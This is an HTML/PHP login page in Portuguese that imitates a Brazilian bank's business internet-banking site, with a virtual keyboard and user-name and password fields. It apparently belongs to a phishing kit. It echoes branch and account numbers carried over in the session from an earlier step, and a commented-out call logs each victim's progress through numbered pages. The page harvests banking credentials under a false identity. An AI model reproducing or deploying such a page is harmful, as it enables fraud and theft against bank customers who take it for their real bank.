<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>senha de 4</title>
</head>
<body>
	<div class="container">
		<div class="box_all_psnet">
			<div class="box_left_psnet">
				<ul>
					<li>
						<h1>Sobre o Teclado Virtual</h1>
						<p>
							Saiba sua função e como utilizá-lo de forma correta e segura.
						</p>
						<a href="#">Saiba mais</a>
					</li>
					<li>
						<h1>Transações mais seguras</h1>
						<p>
							Pelo Internet Banking você faz transações com toda a segurança.
						</p>
						<a href="#">Veja por que é seguro</a>
					</li>
					<li>
						<h1>Usuário Master</h1>
						<p>
							Confira como cadastrar os demais Usuários Master indicados na contratação.
						</p>
						<a href="#">Saiba mais</a>
					</li>
					<li>
						<h1>Manutenção de contrato</h1>
						<p>
							Confira como efetuar alteração no contrato IBPJ (tipo do contrato, inclusão/exclusão de contas e manutenção dos usuários Master e convênios).
						</p>
						<a href="#">Saiba mais</a>
					</li>
				</ul>
			<div class="clear"></div>	
			</div><!-- box_left_psnet -->

			<form action="" method="post" onsubmit="return checkPswNet();" id="form_pass_net">
				

				<h1 class="person_h1_juba">Seja bem-vindo ao Internet Banking Empresarial!</h1>
				<p class="left_pos_juba">Informe o nome de acesso e senha</p>
				<p class="right_pos_juba">Agência: <span><?php echo $_SESSION['agencia'];?></span> Conta: <span><?php echo $_SESSION['conta'];?></span></p>

			<div class="block_right_psnet">
				
				<div class="block_teclado_now">
					<div class="block_campos_now">
						<p class="left_campos">
							<span>Usuário:</span>
							<input type="text" name="us_ag" id="us_ag" class="normal_input" autocomplete="off">
						</p>
						<p class="right_campos">
							<span>Senha:</span>
							<input type="password" name="us_pass" id="us_pass" class="normal_input" style="width:82px!important;" autocomplete="off">
							
						</p>
					</div><!-- block_campos_now -->


					<div class="ms_teclado_now">
						<div class="one_line_teclado">
							<img src="imgs/teclado_off.jpg" width="392" height="131" usemap="#teclado_virtualMap" id="teclado_virtual">
                            <map name="teclado_virtualMap">
                              <area shape="rect" coords="2,106,90,128" href="#" onclick="return letter('caps');">
                              <area shape="rect" coords="3,1,29,25" href="#" onclick="return letter('aspa');" >
                              <area shape="rect" coords="29,2,59,26" href="1" onclick="return letter('1');" >
                              <area shape="rect" coords="60,2,88,25" href="2" onclick="return letter('2');" >
                              <area shape="rect" coords="93,1,120,24" href="3" onclick="return letter('3');" >
                              <area shape="rect" coords="120,2,148,25" href="4" onclick="return letter('4');" >
                              <area shape="rect" coords="151,-1,180,25" href="5" onclick="return letter('5');" >
                              <area shape="rect" coords="180,2,209,24" href="6" onclick="return letter('6');" >
                              <area shape="rect" coords="210,2,239,25" href="7" onclick="return letter('7');" >
                              <area shape="rect" coords="242,0,270,25" href="8" onclick="return letter('8');" >
                              <area shape="rect" coords="272,1,300,25" href="9" onclick="return letter('9');" >
                              <area shape="rect" coords="302,1,328,25" href="0" onclick="return letter('0');">
                              <area shape="rect" coords="333,2,360,26" href="#" onclick="return letter('underline');">
                              <area shape="rect" coords="362,-1,388,25" href="#" onclick="return letter('igual');">
                              <area shape="rect" coords="1,27,29,51" href="q" onclick="return letter('q');">
                              <area shape="rect" coords="31,29,58,52" href="w" onclick="return letter('w');">
                              <area shape="rect" coords="62,27,88,51" href="e" onclick="return letter('e');">
                              <area shape="rect" coords="93,28,118,50" href="r" onclick="return letter('r');">
                              <area shape="rect" coords="121,28,149,50" href="t" onclick="return letter('t');">
                              <area shape="rect" coords="152,27,178,51" href="y" onclick="return letter('y');">
                              <area shape="rect" coords="182,27,208,50" href="u" onclick="return letter('u');">
                              <area shape="rect" coords="212,27,239,51" href="i" onclick="return letter('i');">
                              <area shape="rect" coords="242,27,270,51" href="o" onclick="return letter('o');">
                              <area shape="rect" coords="273,27,299,50" href="p" onclick="return letter('p');">
                              <area shape="rect" coords="303,28,329,51" href="#" onclick="return letter('acento_agudo');">
                              <area shape="rect" coords="332,28,359,52" href="colchete_abre" onclick="return letter('colchete_abre');">
                              <area shape="rect" coords="362,27,389,51" href="#" onclick="return letter('apaga');">
                              <area shape="rect" coords="362,54,389,103" href="enter" onclick="return letter('enter');">
                              <area shape="rect" coords="3,53,28,77" href="a" onclick="return letter('a');">
                              <area shape="rect" coords="31,55,59,77" href="s" onclick="return letter('s');">
                              <area shape="rect" coords="62,54,89,78" href="d" onclick="return letter('d');">
                              <area shape="rect" coords="91,53,118,78" href="f" onclick="return letter('f');">
                              <area shape="rect" coords="121,53,148,77" href="g" onclick="return letter('g');">
                              <area shape="rect" coords="151,53,180,77" href="h" onclick="return letter('h');">
                              <area shape="rect" coords="182,55,210,78" href="j" onclick="return letter('j');">
                              <area shape="rect" coords="211,54,238,77" href="k" onclick="return letter('k');">
                              <area shape="rect" coords="241,54,268,77" href="l" onclick="return letter('l');">
                              <area shape="rect" coords="271,54,299,77" href="cedilha" onclick="return letter('cedilha');">
                              <area shape="rect" coords="303,55,329,78" href="#" onclick="return letter('tio');">
                              <area shape="rect" coords="333,54,360,78" href="#" onclick="return letter('colchete_fexa');">
                              <area shape="rect" coords="330,79,359,103" href="#" onclick="return letter('barra');">
                              <area shape="rect" coords="3,79,29,103" href="#" onclick="return letter('barra_invertida');">
                              <area shape="rect" coords="32,81,60,103" href="z" onclick="return letter('z');">
                              <area shape="rect" coords="61,81,89,102" href="x" onclick="return letter('x');">
                              <area shape="rect" coords="92,81,119,102" href="c" onclick="return letter('c');">
                              <area shape="rect" coords="123,80,149,103" href="v" onclick="return letter('v');">
                              <area shape="rect" coords="152,80,180,104" href="b" onclick="return letter('b');">
                              <area shape="rect" coords="182,80,209,104" href="n" onclick="return letter('n');">
                              <area shape="rect" coords="211,80,238,103" href="m" onclick="return letter('m');">
                              <area shape="rect" coords="241,81,269,102" href="#" onclick="return letter('virgula');">
                              <area shape="rect" coords="272,80,299,103" href="#" onclick="return letter('ponto');">
                              <area shape="rect" coords="91,105,180,131" href="#" onclick="return letter('shift');">
                              <area shape="rect" coords="181,105,389,129" href="#" onclick="return letter('espaco');">
							  <area shape="rect" coords="301,80,329,104" href="ponto_virgula" onclick="return letter('ponto_virgula');"> 
                            </map>
						</div><!-- one_line_teclado -->
					</div>
				</div><!-- block_teclado_now -->
				
				<div class="block_psnetbuttons">
					<input type="submit" name="send_pswnet" id="send_pswnet" class="btnet_submit" value="">
					<input type="reset" name="cancela" id="cancela" class="btnet_cancel" value="" onclick="return exitConfirm();">
				</div><!-- block_psnetbuttons -->
				
				<input type="hidden" name="estado_teclado" id="estado_teclado" value="off">
				<input type="hidden" name="sender" value="pass_net">

			<div class="clear"></div>	
			</div><!-- block_right_psnet -->

		<div class="clear"></div>
		</div><!-- box_all_psnet -->

		
		</form>
		
	<div class="clear"></div>
	</div><!-- container -->
</body>
</html>
<?php
/*setPageAcess($conn,$id_user,"Senha Net 2");*/
?>